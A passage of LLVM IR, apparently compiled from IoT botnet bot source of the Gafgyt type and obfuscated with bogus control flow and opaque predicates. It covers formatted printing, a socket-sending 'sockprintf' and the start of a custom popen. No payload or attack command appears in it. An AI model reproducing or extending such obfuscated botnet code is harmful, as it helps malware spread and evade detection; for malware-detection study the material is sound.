  %212 = or i1 %210, %211
  br i1 %212, label %originalBB49, label %originalBB49alteredBB

originalBB49:                                     ; preds = %originalBB49alteredBB, %204
  %213 = load i8*, i8** %6, align 8
  %214 = load i8, i8* %213, align 1
  %215 = icmp ne i8 %214, 0
  %216 = load i32, i32* @x.9
  %217 = load i32, i32* @y.10
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBBpart251, label %originalBB49alteredBB

originalBBpart251:                                ; preds = %originalBB49
  br i1 %215, label %224, label %250

; <label>:224:                                    ; preds = %originalBBpart251
  %225 = load i32, i32* @x.9
  %226 = load i32, i32* @y.10
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB53, label %originalBB53alteredBB

originalBB53:                                     ; preds = %originalBB53alteredBB, %224
  %233 = load i8**, i8*** %5, align 8
  %234 = load i8*, i8** %6, align 8
  %235 = load i8, i8* %234, align 1
  %236 = zext i8 %235 to i32
  call void @printchar(i8** %233, i32 %236)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, 1
  store i32 %238, i32* %9, align 4
  %239 = load i32, i32* @x.9
  %240 = load i32, i32* @y.10
  %241 = sub i32 %239, 1
  %242 = mul i32 %239, %241
  %243 = urem i32 %242, 2
  %244 = icmp eq i32 %243, 0
  %245 = icmp slt i32 %240, 10
  %246 = or i1 %244, %245
  br i1 %246, label %originalBBpart259, label %originalBB53alteredBB

originalBBpart259:                                ; preds = %originalBB53
  br label %247

; <label>:247:                                    ; preds = %originalBBpart259
  %248 = load i8*, i8** %6, align 8
  %249 = getelementptr inbounds i8, i8* %248, i32 1
  store i8* %249, i8** %6, align 8
  br label %204

; <label>:250:                                    ; preds = %originalBBpart251
  br label %251

; <label>:251:                                    ; preds = %275, %250
  %252 = load i32, i32* %7, align 4
  %253 = icmp sgt i32 %252, 0
  br i1 %253, label %254, label %278

; <label>:254:                                    ; preds = %251
  %255 = load i32, i32* @x.9
  %256 = load i32, i32* @y.10
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBB61, label %originalBB61alteredBB

originalBB61:                                     ; preds = %originalBB61alteredBB, %254
  %263 = load i8**, i8*** %5, align 8
  %264 = load i32, i32* %10, align 4
  call void @printchar(i8** %263, i32 %264)
  %265 = load i32, i32* %9, align 4
  %266 = add nsw i32 %265, 1
  store i32 %266, i32* %9, align 4
  %267 = load i32, i32* @x.9
  %268 = load i32, i32* @y.10
  %269 = sub i32 %267, 1
  %270 = mul i32 %267, %269
  %271 = urem i32 %270, 2
  %272 = icmp eq i32 %271, 0
  %273 = icmp slt i32 %268, 10
  %274 = or i1 %272, %273
  br i1 %274, label %originalBBpart273, label %originalBB61alteredBB

originalBBpart273:                                ; preds = %originalBB61
  br label %275

; <label>:275:                                    ; preds = %originalBBpart273
  %276 = load i32, i32* %7, align 4
  %277 = add nsw i32 %276, -1
  store i32 %277, i32* %7, align 4
  br label %251

; <label>:278:                                    ; preds = %251
  %279 = load i32, i32* %9, align 4
  ret i32 %279

originalBBalteredBB:                              ; preds = %originalBB, %17
  %280 = load i8*, i8** %12, align 8
  %281 = load i8, i8* %280, align 1
  %282 = icmp ne i8 %281, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  store i32 0, i32* %7, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %68
  %283 = load i32, i32* %8, align 4
  %_ = shl i32 %283, 2
  %_7 = shl i32 %283, 2
  %_8 = sub i32 0, %283
  %gen = add i32 %_8, 2
  %_9 = sub i32 %283, 2
  %gen10 = mul i32 %_9, 2
  %_11 = sub i32 0, %283
  %gen12 = add i32 %_11, 2
  %_13 = shl i32 %283, 2
  %_14 = sub i32 %283, 2
  %gen15 = mul i32 %_14, 2
  %284 = and i32 %283, 2
  %285 = icmp ne i32 %284, 0
  br label %originalBB6

originalBB19alteredBB:                            ; preds = %originalBB19, %88
  store i32 48, i32* %10, align 4
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %105
  br label %originalBB23

originalBB27alteredBB:                            ; preds = %originalBB27, %126
  br label %originalBB27

originalBB31alteredBB:                            ; preds = %originalBB31, %143
  %286 = load i32, i32* %7, align 4
  %287 = icmp sgt i32 %286, 0
  br label %originalBB31

originalBB35alteredBB:                            ; preds = %originalBB35, %167
  %288 = load i32, i32* %7, align 4
  %_36 = shl i32 %288, -1
  %_37 = shl i32 %288, -1
  %_38 = sub i32 %288, -1
  %gen39 = mul i32 %_38, -1
  %_40 = sub i32 0, %288
  %gen41 = add i32 %_40, -1
  %289 = add nsw i32 %288, -1
  store i32 %289, i32* %7, align 4
  br label %originalBB35

originalBB45alteredBB:                            ; preds = %originalBB45, %186
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %204
  %290 = load i8*, i8** %6, align 8
  %291 = load i8, i8* %290, align 1
  %292 = icmp ne i8 %291, 0
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %224
  %293 = load i8**, i8*** %5, align 8
  %294 = load i8*, i8** %6, align 8
  %295 = load i8, i8* %294, align 1
  %296 = zext i8 %295 to i32
  call void @printchar(i8** %293, i32 %296)
  %297 = load i32, i32* %9, align 4
  %_54 = sub i32 0, %297
  %gen55 = add i32 %_54, 1
  %_56 = sub i32 %297, 1
  %gen57 = mul i32 %_56, 1
  %298 = add nsw i32 %297, 1
  store i32 %298, i32* %9, align 4
  br label %originalBB53

originalBB61alteredBB:                            ; preds = %originalBB61, %254
  %299 = load i8**, i8*** %5, align 8
  %300 = load i32, i32* %10, align 4
  call void @printchar(i8** %299, i32 %300)
  %301 = load i32, i32* %9, align 4
  %_62 = sub i32 0, %301
  %gen63 = add i32 %_62, 1
  %_64 = sub i32 0, %301
  %gen65 = add i32 %_64, 1
  %_66 = sub i32 %301, 1
  %gen67 = mul i32 %_66, 1
  %_68 = sub i32 %301, 1
  %gen69 = mul i32 %_68, 1
  %_70 = sub i32 %301, 1
  %gen71 = mul i32 %_70, 1
  %302 = add nsw i32 %301, 1
  store i32 %302, i32* %9, align 4
  br label %originalBB61
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = load i32, i32* @x.11
  %9 = load i32, i32* @y.12
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = alloca i32, align 4
  %17 = alloca i8**, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [12 x i8], align 1
  %25 = alloca i8*, align 8
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  store i8** %0, i8*** %17, align 8
  store i32 %1, i32* %18, align 4
  store i32 %2, i32* %19, align 4
  store i32 %3, i32* %20, align 4
  store i32 %4, i32* %21, align 4
  store i32 %5, i32* %22, align 4
  store i32 %6, i32* %23, align 4
  store i32 0, i32* %27, align 4
  store i32 0, i32* %28, align 4
  %30 = load i32, i32* %18, align 4
  store i32 %30, i32* %29, align 4
  %31 = load i32, i32* %18, align 4
  %32 = icmp eq i32 %31, 0
  %33 = load i32, i32* @x.11
  %34 = load i32, i32* @y.12
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %32, label %41, label %65

; <label>:41:                                     ; preds = %originalBBpart2
  %42 = load i32, i32* @x.11
  %43 = load i32, i32* @y.12
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %41
  %50 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %50, align 1
  %51 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %51, align 1
  %52 = load i8**, i8*** %17, align 8
  %53 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %22, align 4
  %56 = call i32 @prints(i8** %52, i8* %53, i32 %54, i32 %55)
  store i32 %56, i32* %16, align 4
  %57 = load i32, i32* @x.11
  %58 = load i32, i32* @y.12
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %214

; <label>:65:                                     ; preds = %originalBBpart2
  %66 = load i32, i32* %20, align 4
  %67 = icmp ne i32 %66, 0
  br i1 %67, label %68, label %77

; <label>:68:                                     ; preds = %65
  %69 = load i32, i32* %19, align 4
  %70 = icmp eq i32 %69, 10
  br i1 %70, label %71, label %77

; <label>:71:                                     ; preds = %68
  %72 = load i32, i32* %18, align 4
  %73 = icmp slt i32 %72, 0
  br i1 %73, label %74, label %77

; <label>:74:                                     ; preds = %71
  store i32 1, i32* %27, align 4
  %75 = load i32, i32* %18, align 4
  %76 = sub nsw i32 0, %75
  store i32 %76, i32* %29, align 4
  br label %77

; <label>:77:                                     ; preds = %74, %71, %68, %65
  %78 = load i32, i32* @x.11
  %79 = load i32, i32* @y.12
  %80 = sub i32 %78, 1
  %81 = mul i32 %78, %80
  %82 = urem i32 %81, 2
  %83 = icmp eq i32 %82, 0
  %84 = icmp slt i32 %79, 10
  %85 = or i1 %83, %84
  br i1 %85, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %77
  %86 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %87 = getelementptr inbounds i8, i8* %86, i64 12
  %88 = getelementptr inbounds i8, i8* %87, i64 -1
  store i8* %88, i8** %25, align 8
  %89 = load i8*, i8** %25, align 8
  store i8 0, i8* %89, align 1
  %90 = load i32, i32* @x.11
  %91 = load i32, i32* @y.12
  %92 = sub i32 %90, 1
  %93 = mul i32 %90, %92
  %94 = urem i32 %93, 2
  %95 = icmp eq i32 %94, 0
  %96 = icmp slt i32 %91, 10
  %97 = or i1 %95, %96
  br i1 %97, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %98

; <label>:98:                                     ; preds = %originalBBpart231, %originalBBpart28
  %99 = load i32, i32* %29, align 4
  %100 = icmp ne i32 %99, 0
  br i1 %100, label %101, label %154

; <label>:101:                                    ; preds = %98
  %102 = load i32, i32* @x.11
  %103 = load i32, i32* @y.12
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i32, i32* %29, align 4
  %111 = load i32, i32* %19, align 4
  %112 = urem i32 %110, %111
  store i32 %112, i32* %26, align 4
  %113 = load i32, i32* %26, align 4
  %114 = icmp sge i32 %113, 10
  %115 = load i32, i32* @x.11
  %116 = load i32, i32* @y.12
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %114, label %123, label %129

; <label>:123:                                    ; preds = %originalBBpart212
  %124 = load i32, i32* %23, align 4
  %125 = sub nsw i32 %124, 48
  %126 = sub nsw i32 %125, 10
  %127 = load i32, i32* %26, align 4
  %128 = add nsw i32 %127, %126
  store i32 %128, i32* %26, align 4
  br label %129

; <label>:129:                                    ; preds = %123, %originalBBpart212
  %130 = load i32, i32* @x.11
  %131 = load i32, i32* @y.12
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %129
  %138 = load i32, i32* %26, align 4
  %139 = add nsw i32 %138, 48
  %140 = trunc i32 %139 to i8
  %141 = load i8*, i8** %25, align 8
  %142 = getelementptr inbounds i8, i8* %141, i32 -1
  store i8* %142, i8** %25, align 8
  store i8 %140, i8* %142, align 1
  %143 = load i32, i32* %19, align 4
  %144 = load i32, i32* %29, align 4
  %145 = udiv i32 %144, %143
  store i32 %145, i32* %29, align 4
  %146 = load i32, i32* @x.11
  %147 = load i32, i32* @y.12
  %148 = sub i32 %146, 1
  %149 = mul i32 %146, %148
  %150 = urem i32 %149, 2
  %151 = icmp eq i32 %150, 0
  %152 = icmp slt i32 %147, 10
  %153 = or i1 %151, %152
  br i1 %153, label %originalBBpart231, label %originalBB14alteredBB

originalBBpart231:                                ; preds = %originalBB14
  br label %98

; <label>:154:                                    ; preds = %98
  %155 = load i32, i32* @x.11
  %156 = load i32, i32* @y.12
  %157 = sub i32 %155, 1
  %158 = mul i32 %155, %157
  %159 = urem i32 %158, 2
  %160 = icmp eq i32 %159, 0
  %161 = icmp slt i32 %156, 10
  %162 = or i1 %160, %161
  br i1 %162, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %154
  %163 = load i32, i32* %27, align 4
  %164 = icmp ne i32 %163, 0
  %165 = load i32, i32* @x.11
  %166 = load i32, i32* @y.12
  %167 = sub i32 %165, 1
  %168 = mul i32 %165, %167
  %169 = urem i32 %168, 2
  %170 = icmp eq i32 %169, 0
  %171 = icmp slt i32 %166, 10
  %172 = or i1 %170, %171
  br i1 %172, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %164, label %173, label %206

; <label>:173:                                    ; preds = %originalBBpart235
  %174 = load i32, i32* %21, align 4
  %175 = icmp ne i32 %174, 0
  br i1 %175, label %176, label %186

; <label>:176:                                    ; preds = %173
  %177 = load i32, i32* %22, align 4
  %178 = and i32 %177, 2
  %179 = icmp ne i32 %178, 0
  br i1 %179, label %180, label %186

; <label>:180:                                    ; preds = %176
  %181 = load i8**, i8*** %17, align 8
  call void @printchar(i8** %181, i32 45)
  %182 = load i32, i32* %28, align 4
  %183 = add nsw i32 %182, 1
  store i32 %183, i32* %28, align 4
  %184 = load i32, i32* %21, align 4
  %185 = add nsw i32 %184, -1
  store i32 %185, i32* %21, align 4
  br label %205

; <label>:186:                                    ; preds = %176, %173
  %187 = load i32, i32* @x.11
  %188 = load i32, i32* @y.12
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %186
  %195 = load i8*, i8** %25, align 8
  %196 = getelementptr inbounds i8, i8* %195, i32 -1
  store i8* %196, i8** %25, align 8
  store i8 45, i8* %196, align 1
  %197 = load i32, i32* @x.11
  %198 = load i32, i32* @y.12
  %199 = sub i32 %197, 1
  %200 = mul i32 %197, %199
  %201 = urem i32 %200, 2
  %202 = icmp eq i32 %201, 0
  %203 = icmp slt i32 %198, 10
  %204 = or i1 %202, %203
  br i1 %204, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %205

; <label>:205:                                    ; preds = %originalBBpart239, %180
  br label %206

; <label>:206:                                    ; preds = %205, %originalBBpart235
  %207 = load i32, i32* %28, align 4
  %208 = load i8**, i8*** %17, align 8
  %209 = load i8*, i8** %25, align 8
  %210 = load i32, i32* %21, align 4
  %211 = load i32, i32* %22, align 4
  %212 = call i32 @prints(i8** %208, i8* %209, i32 %210, i32 %211)
  %213 = add nsw i32 %207, %212
  store i32 %213, i32* %16, align 4
  br label %214

; <label>:214:                                    ; preds = %206, %originalBBpart24
  %215 = load i32, i32* %16, align 4
  ret i32 %215

originalBBalteredBB:                              ; preds = %originalBB, %7
  %216 = alloca i32, align 4
  %217 = alloca i8**, align 8
  %218 = alloca i32, align 4
  %219 = alloca i32, align 4
  %220 = alloca i32, align 4
  %221 = alloca i32, align 4
  %222 = alloca i32, align 4
  %223 = alloca i32, align 4
  %224 = alloca [12 x i8], align 1
  %225 = alloca i8*, align 8
  %226 = alloca i32, align 4
  %227 = alloca i32, align 4
  %228 = alloca i32, align 4
  %229 = alloca i32, align 4
  store i8** %0, i8*** %217, align 8
  store i32 %1, i32* %218, align 4
  store i32 %2, i32* %219, align 4
  store i32 %3, i32* %220, align 4
  store i32 %4, i32* %221, align 4
  store i32 %5, i32* %222, align 4
  store i32 %6, i32* %223, align 4
  store i32 0, i32* %227, align 4
  store i32 0, i32* %228, align 4
  %230 = load i32, i32* %218, align 4
  store i32 %230, i32* %229, align 4
  %231 = load i32, i32* %218, align 4
  %232 = icmp eq i32 %231, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %41
  %233 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 0
  store i8 48, i8* %233, align 1
  %234 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i64 0, i64 1
  store i8 0, i8* %234, align 1
  %235 = load i8**, i8*** %17, align 8
  %236 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %237 = load i32, i32* %21, align 4
  %238 = load i32, i32* %22, align 4
  %239 = call i32 @prints(i8** %235, i8* %236, i32 %237, i32 %238)
  store i32 %239, i32* %16, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %77
  %240 = getelementptr inbounds [12 x i8], [12 x i8]* %24, i32 0, i32 0
  %241 = getelementptr inbounds i8, i8* %240, i64 12
  %242 = getelementptr inbounds i8, i8* %241, i64 -1
  store i8* %242, i8** %25, align 8
  %243 = load i8*, i8** %25, align 8
  store i8 0, i8* %243, align 1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  %244 = load i32, i32* %29, align 4
  %245 = load i32, i32* %19, align 4
  %_ = sub i32 0, %244
  %gen = add i32 %_, %245
  %246 = urem i32 %244, %245
  store i32 %246, i32* %26, align 4
  %247 = load i32, i32* %26, align 4
  %248 = icmp sge i32 %247, 10
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %129
  %249 = load i32, i32* %26, align 4
  %_15 = shl i32 %249, 48
  %_16 = sub i32 0, %249
  %gen17 = add i32 %_16, 48
  %250 = add nsw i32 %249, 48
  %251 = trunc i32 %250 to i8
  %252 = load i8*, i8** %25, align 8
  %253 = getelementptr inbounds i8, i8* %252, i32 -1
  store i8* %253, i8** %25, align 8
  store i8 %251, i8* %253, align 1
  %254 = load i32, i32* %19, align 4
  %255 = load i32, i32* %29, align 4
  %_18 = sub i32 0, %255
  %gen19 = add i32 %_18, %254
  %_20 = sub i32 %255, %254
  %gen21 = mul i32 %_20, %254
  %_22 = sub i32 %255, %254
  %gen23 = mul i32 %_22, %254
  %_24 = sub i32 %255, %254
  %gen25 = mul i32 %_24, %254
  %_26 = sub i32 0, %255
  %gen27 = add i32 %_26, %254
  %_28 = shl i32 %255, %254
  %_29 = shl i32 %255, %254
  %256 = udiv i32 %255, %254
  store i32 %256, i32* %29, align 4
  br label %originalBB14

originalBB33alteredBB:                            ; preds = %originalBB33, %154
  %257 = load i32, i32* %27, align 4
  %258 = icmp ne i32 %257, 0
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %186
  %259 = load i8*, i8** %25, align 8
  %260 = getelementptr inbounds i8, i8* %259, i32 -1
  store i8* %260, i8** %25, align 8
  store i8 45, i8* %260, align 1
  br label %originalBB37
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8* %1, i8** %4, align 8
  %9 = call noalias i8* @malloc(i64 2048) #2
  store i8* %9, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  call void @llvm.memset.p0i8.i64(i8* %10, i8 0, i64 2048, i32 1, i1 false)
  %11 = load i8*, i8** %5, align 8
  store i8* %11, i8** %6, align 8
  %12 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %13 = bitcast %struct.__va_list_tag* %12 to i8*
  call void @llvm.va_start(i8* %13)
  %14 = load i8*, i8** %4, align 8
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = call i32 @print(i8** %5, i8* %14, %struct.__va_list_tag* %15)
  %17 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %18 = bitcast %struct.__va_list_tag* %17 to i8*
  call void @llvm.va_end(i8* %18)
  %19 = load i8*, i8** %6, align 8
  %20 = load i8*, i8** %6, align 8
  %21 = call i64 @strlen(i8* %20) #10
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  store i8 10, i8* %22, align 1
  %23 = load i8*, i8** %6, align 8
  %24 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.17, i32 0, i32 0), i8* %23)
  %25 = load i32, i32* %3, align 4
  %26 = load i8*, i8** %6, align 8
  %27 = load i8*, i8** %6, align 8
  %28 = call i64 @strlen(i8* %27) #10
  %29 = call i64 @send(i32 %25, i8* %26, i64 %28, i32 16384)
  %30 = trunc i64 %29 to i32
  store i32 %30, i32* %8, align 4
  %31 = load i8*, i8** %6, align 8
  call void @free(i8* %31) #2
  %32 = load i32, i32* %8, align 4
  ret i32 %32
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = load i32, i32* @x.19
  %4 = load i32, i32* @y.20
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca [2 x i32], align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  store i8* %0, i8** %12, align 8
  store i8* %1, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp ne i32 %20, 114
  %22 = load i32, i32* @x.19
  %23 = load i32, i32* @y.20
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %21, label %30, label %35

; <label>:30:                                     ; preds = %originalBBpart2
  %31 = load i8*, i8** %13, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp ne i32 %33, 119
  br i1 %34, label %41, label %35

; <label>:35:                                     ; preds = %30, %originalBBpart2
  %36 = load i8*, i8** %13, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %35, %30
  store i32 -1, i32* %11, align 4
  br label %285

; <label>:42:                                     ; preds = %35
  %43 = getelementptr inbounds [2 x i32], [2 x i32]* %15, i32 0, i32 0
  %44 = call i32 @pipe(i32* %43) #2
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %42
  store i32 -1, i32* %11, align 4
  br label %285

; <label>:47:                                     ; preds = %42
  %48 = load i32*, i32** @fdopen_pids, align 8
  %49 = icmp eq i32* %48, null
  br i1 %49, label %50, label %134

; <label>:50:                                     ; preds = %47
  %51 = load i32, i32* @x.19
  %52 = load i32, i32* @y.20
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %50
  %59 = call i32 @getdtablesize() #2
  store i32 %59, i32* %16, align 4
  %60 = icmp sle i32 %59, 0
  %61 = load i32, i32* @x.19
  %62 = load i32, i32* @y.20
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %60, label %69, label %70

; <label>:69:                                     ; preds = %originalBBpart24
  store i32 -1, i32* %11, align 4
  br label %285

; <label>:70:                                     ; preds = %originalBBpart24
  %71 = load i32, i32* @x.19
  %72 = load i32, i32* @y.20
  %73 = sub i32 %71, 1
  %74 = mul i32 %71, %73
  %75 = urem i32 %74, 2
  %76 = icmp eq i32 %75, 0
  %77 = icmp slt i32 %72, 10
  %78 = or i1 %76, %77
  br i1 %78, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %70
  %79 = load i32, i32* %16, align 4
  %80 = sext i32 %79 to i64
  %81 = mul i64 %80, 4
  %82 = trunc i64 %81 to i32
  %83 = zext i32 %82 to i64
  %84 = call noalias i8* @malloc(i64 %83) #2
  %85 = bitcast i8* %84 to i32*
  store i32* %85, i32** @fdopen_pids, align 8
  %86 = icmp eq i32* %85, null
  %87 = load i32, i32* @x.19
  %88 = load i32, i32* @y.20
  %89 = sub i32 %87, 1
  %90 = mul i32 %87, %89
  %91 = urem i32 %90, 2
  %92 = icmp eq i32 %91, 0
